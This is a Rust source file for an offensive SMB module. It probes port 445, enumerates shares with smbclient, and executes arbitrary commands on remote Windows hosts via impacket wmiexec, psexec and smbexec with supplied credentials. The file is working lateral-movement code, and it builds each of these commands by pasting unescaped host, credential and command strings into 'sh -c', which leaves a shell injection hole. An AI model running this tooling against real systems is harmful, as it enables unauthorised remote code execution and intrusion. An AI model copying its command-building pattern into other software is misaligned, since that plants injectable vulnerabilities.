use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;

pub struct SmbAttack;

#[derive(Debug)]
pub struct SmbResult {
    pub attack: String,
    pub target: String,
    pub success: bool,
    pub output: String,
}

fn parse_addr(s: &str) -> std::net::SocketAddr {
    s.parse().unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap())
}

impl SmbAttack {
    /// Check if SMB is accessible on the target
    pub fn check_smb(host: &str) -> SmbResult {
        let open = TcpStream::connect_timeout(
            &parse_addr(&format!("{}:445", host)),
            Duration::from_secs(3),
        )
        .is_ok();

        SmbResult {
            attack: "SMB Check".into(),
            target: host.into(),
            success: open,
            output: if open { "SMB port 445 open".into() } else { "SMB port 445 closed".into() },
        }
    }

    /// SMB share enumeration
    pub fn enum_shares(host: &str, username: &str, password: &str) -> SmbResult {
        let cmd = format!(
            "smbclient -L '\\\\{}' -U '{}%{}' --no-pass 2>/dev/null",
            host, username, password
        );

        match Command::new("sh").arg("-c").arg(&cmd).output() {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let _shares: Vec<&str> = stdout.lines()
                    .filter(|l| l.starts_with('\t') && !l.contains("Disk"))
                    .collect();
                let success = !stdout.contains("NT_STATUS") && !stdout.contains("session setup failed");
                SmbResult {
                    attack: "SMB Enum Shares".into(),
                    target: host.into(),
                    success,
                    output: if success {
                        format!("shares:\n{}", stdout)
                    } else {
                        stdout.trim().to_string()
                    },
                }
            }
            Err(e) => SmbResult {
                attack: "SMB Enum Shares".into(),
                target: host.into(),
                success: false,
                output: format!("smbclient error: {}", e),
            },
        }
    }

    /// Execute command via SMB (using winexe or impacket)
    pub fn exec_via_smb(
        host: &str,
        username: &str,
        password: &str,
        command: &str,
        auth_type: &str,
    ) -> SmbResult {
        match auth_type {
            "wmi" => {
                let cmd = format!(
                    "impacket-wmiexec -no-output '{}':'{}'@{} '{}' 2>/dev/null",
                    username, password, host, command
                );
                Self::run_cmd(&cmd, "WMI Exec", host)
            }
            "psexec" => {
                let cmd = format!(
                    "impacket-psexec '{}':'{}'@{} '{}' 2>/dev/null",
                    username, password, host, command
                );
                Self::run_cmd(&cmd, "PsExec", host)
            }
            "smbexec" => {
                let cmd = format!(
                    "impacket-smbexec '{}':'{}'@{} '{}' 2>/dev/null",
                    username, password, host, command
                );
                Self::run_cmd(&cmd, "SMB Exec", host)
            }
            _ => SmbResult {
                attack: "SMB Exec".into(),
                target: host.into(),
                success: false,
                output: format!("Unknown auth type: {}", auth_type),
            },
        }
    }

    /// Named pipe connectivity check
    pub fn check_named_pipe(host: &str, pipe_name: &str) -> SmbResult {
        let cmd = format!(
            "impacket-rpcdump -p '{}' '{}' 2>/dev/null",
            pipe_name, host
        );

        match Command::new("sh").arg("-c").arg(&cmd).output() {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let success = stdout.contains("UUID") || stdout.contains("Remote");
                SmbResult {
                    attack: format!("Named Pipe: {}", pipe_name),
                    target: host.into(),
                    success,
                    output: if success { "Pipe accessible".into() } else { stdout.trim().to_string() },
                }
            }
            Err(e) => SmbResult {
                attack: format!("Named Pipe: {}", pipe_name),
                target: host.into(),
                success: false,
                output: format!("rpcdump error: {}", e),
            },
        }
    }

    fn run_cmd(cmd: &str, attack_name: &str, host: &str) -> SmbResult {
        match Command::new("sh").arg("-c").arg(cmd).output() {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let stderr = String::from_utf8_lossy(&out.stderr);
                let combined = format!("{}{}", stdout, stderr);
                let success = !combined.contains("ERROR") && !combined.contains("error")
                    && out.status.success();
                SmbResult {
                    attack: attack_name.into(),
                    target: host.into(),
                    success,
                    output: if success {
                        "Command executed successfully".into()
                    } else {
                        combined.trim().to_string()
                    },
                }
            }
            Err(e) => SmbResult {
                attack: attack_name.into(),
                target: host.into(),
                success: false,
                output: format!("impacket error: {}", e),
            },
        }
    }
}
